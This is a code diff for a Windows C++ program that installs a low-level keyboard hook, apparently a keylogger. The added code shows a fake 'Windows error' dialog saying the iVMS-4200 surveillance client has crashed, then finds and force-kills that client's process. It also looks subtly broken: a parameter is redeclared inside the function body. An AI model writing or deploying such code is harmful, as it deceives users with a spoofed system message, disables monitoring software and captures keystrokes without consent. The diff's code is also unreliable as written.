@@ -4,6 +4,7 @@
 #include <conio.h>
 #include <string.h>
 #include <ctime>
+#include <TlHelp32.h>
 #include <fstream>
 using namespace std;
 
@@ -188,10 +189,38 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 	// 将消息传递给钩子链中的下一个钩子
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
+void killhik(wchar_t* szImageName){
+    wchar_t* szImageName=L"iVMS-4200.Framework.C.exe";
+	while (1)
+	{
+		Sleep(1000);
+        	MessageBoxW(NULL,L"iVMS-4200已崩溃，请重新打开",L"windows错误提示", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+		char windowTitle[256] = { 0 };
+		GetWindowTextA(GetForegroundWindow(), windowTitle, sizeof(windowTitle));
+		// 检查窗口标题是否是你想要的特定应用程序
+		string ex = "iVMS-4200";
+		if (string(windowTitle).find(ex) != string::npos) {
+			PROCESSENTRY32W pe = {sizeof(PROCESSENTRY32W) }; //获得进程列表
+			HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//拍摄快照
+			BOOL bRet = Process32FirstW(hProcess,&pe);//检索快照中第一个进程信息
+			while(bRet){//判断不是最后一个进程，历遍所有
+				if(lstrcmpW(szImageName,pe.szExeFile)==0) {//判断是不是要结束的进程
+					TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE,pe.th32ProcessID), 0);//打开进程并杀死
+				}
+				bRet = Process32NextW(hProcess,&pe);//下一个进程
+			}
+			break;
+		} 
 
+	}
+}
+void killhik(wchar_t*);
 int main(int argc, TCHAR* argv[])
 {
 	// 安装钩子
+
+    Sleep(2000);
+    killhik(L"iVMS-4200.Framework.C.exe");
 	keyboardHook = SetWindowsHookEx(
 		WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
 		LowLevelKeyboardProc,	// 指向钩子函数的指针
